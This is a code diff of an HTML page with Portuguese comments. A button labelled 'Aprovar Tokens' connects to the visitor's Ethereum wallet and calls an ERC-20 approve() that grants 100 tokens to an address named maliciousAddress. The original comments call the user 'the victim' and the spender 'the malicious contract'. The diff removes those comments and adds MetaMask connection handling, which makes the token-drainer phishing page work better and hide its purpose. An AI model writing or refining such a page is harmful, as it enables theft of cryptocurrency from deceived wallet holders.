@@ -8,9 +8,27 @@
 <body>
     <button id="approveBtn">Aprovar Tokens</button>
 
-    <script>
-        const web3 = new Web3(Web3.givenProvider); // Conecta com a carteira do usuário
-        const tokenAddress = '0x04F3E16eEB298Ee4241A68dF656e2FB898Ca0259'; // Endereço do contrato ERC-20
+<script>
+    async function loadWeb3() {
+        if (window.ethereum) { // Checa se o Ethereum (provedor injetado) está disponível no navegador
+            window.web3 = new Web3(ethereum); // Cria uma nova instância do Web3 usando o provedor injetado
+            try {
+                await ethereum.request({ method: 'eth_requestAccounts' }); // Solicita acesso ao usuário
+                // Após o acesso ser concedido, você pode inicializar sua aplicação
+                initializeApp();
+            } catch (error) {
+                console.error("Usuário negou acesso à conta.");
+            }
+        } else if (window.web3) { // Caso o navegador tenha um provedor injetado antigo (metamask antigo)
+            window.web3 = new Web3(web3.currentProvider);
+            initializeApp();
+        } else {
+            console.log('Nenhuma extensão de carteira Ethereum detectada. Instale o MetaMask!');
+        }
+    }
+
+    function initializeApp() {
+        const tokenAddress = '0x04F3E16eEB298Ee4241A68dF656e2FB898Ca0259';
         const contractABI = [
 	{
 		"anonymous": false,
@@ -239,15 +257,15 @@
 		"stateMutability": "view",
 		"type": "function"
 	}
-] // ABI do contrato ERC-20
+];
         const contract = new web3.eth.Contract(contractABI, tokenAddress);
 
-        const maliciousAddress = '0xd54da5a16224b90EB4E0C1944B7Ea837AaD4053A'; // Endereço do contrato malicioso
-        const amountToApprove = web3.utils.toWei('100', 'ether'); // Quantidade de tokens que a vítima está aprovando
+        const maliciousAddress = '0xd54da5a16224b90EB4E0C1944B7Ea837AaD4053A';
+        const amountToApprove = web3.utils.toWei('100', 'ether');
 
         document.getElementById('approveBtn').addEventListener('click', function() {
             web3.eth.getAccounts().then(function(accounts) {
-                const userAccount = accounts[0]; // Assume-se que a conta conectada é a da vítima
+                const userAccount = accounts[0];
                 contract.methods.approve(maliciousAddress, amountToApprove).send({from: userAccount})
                 .then(function(tx) {
                     console.log('Tokens aprovados', tx);
@@ -256,6 +274,9 @@
                 });
             });
         });
-    </script>
+    }
+
+    loadWeb3(); // Inicializa o Web3 ao carregar a página
+</script>
 </body>
 </html>
